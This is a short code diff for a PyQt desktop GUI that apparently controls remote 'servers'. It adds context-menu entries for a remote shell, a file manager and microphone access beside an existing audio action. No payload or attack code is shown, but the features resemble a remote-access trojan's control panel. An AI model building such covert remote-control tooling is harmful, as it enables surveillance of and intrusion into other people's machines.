@@ -393,12 +393,15 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             server_index = self.serversTable.currentRow()
             self.eMenu = QMenu(self)
             self.optionsMenu = QMenu('Server Options', self)
+            self.optionsMenu.setIcon(QIcon(os.path.join(self.assets, 'settings.png')))
 
             if self.serversTable.item(server_index, self.index_of_lock).text() == 'LOCKED':
                 self.eMenu.addAction(QIcon(os.path.join(self.assets, 'unlock.png')), 'Unlock Server', self.unlockServer)
 
             else:
-                self.eMenu.addAction(QIcon(os.path.join(self.assets, 'lock_2.png')), 'Start Audio', self.runAudio)
+                self.eMenu.addAction(QIcon(os.path.join(self.assets, 'mshell.png')), 'Shell', self.runShell)
+                self.eMenu.addAction(QIcon(os.path.join(self.assets, 'mexplorer.png')), 'File Manager', self.runExplorer)
+                self.eMenu.addAction(QIcon(os.path.join(self.assets, 'maudio.png')), 'Microphone', self.runAudio)
 
                 self.eMenu.addSeparator()
                 self.eMenu.addMenu(self.optionsMenu)
